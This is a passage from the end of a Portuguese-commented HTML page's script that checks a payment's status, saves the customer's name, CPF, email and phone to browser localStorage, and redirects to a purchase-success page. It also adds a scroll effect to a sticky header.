              return baseUrl + (baseUrl.includes('?') ? '&' : '?') + urlSearchParams.toString();
            }
            
            // Extrair dados do cliente com fallbacks para diferentes nomes de campos
            const customerName = data.customer_name || data.name || data.nome || document.getElementById('clientName')?.textContent || '';
            const customerCpf = data.customer_document || data.cpf || data.document || document.getElementById('clientCpf')?.textContent || '';
            const customerEmail = data.email || data.customer_email || '';
            const customerPhone = data.phone || data.telefone || data.customer_phone || '';
            const amount = data.amount || data.valor || 197.90;
            
            // Salvar dados do usuário para uso posterior
            const userPaymentData = {
              name: customerName,
              cpf: customerCpf,
              email: customerEmail,
              phone: customerPhone,
              amount: amount,
              transaction_id: transaction_id,
              timestamp: new Date().toISOString()
            };
            
            try {
              localStorage.setItem('userPaymentData', JSON.stringify(userPaymentData));
              console.log("Dados de pagamento do usuário salvos:", userPaymentData);
            } catch (e) {
              console.error("Erro ao salvar dados do usuário:", e);
            }
            
            // Redirecionar para página de sucesso
            window.location.href = appendUrlParams('/compra_sucesso');
          } else if (!isAutoCheck) {
            alert('Pagamento ainda não confirmado. Por favor, aguarde ou verifique se o pagamento foi realizado corretamente.');
          }
        })
        .catch(error => {
          console.error('Erro ao verificar status:', error);
          if (!isAutoCheck) {
            alert('Erro ao verificar status do pagamento. Por favor, tente novamente.');
          }
        });
    }
    
    // Inicializar quando a página carregar
    window.onload = function() {
      initializePageData();
      
      // Efeito de scroll na barra de navegação
      window.addEventListener('scroll', function() {
        var header = document.querySelector('.sticky-header');
        if (window.pageYOffset > 0) {
          header.classList.add('shadow');
        } else {
          header.classList.remove('shadow');
        }
      });
    };
  </script>
</body>
</html>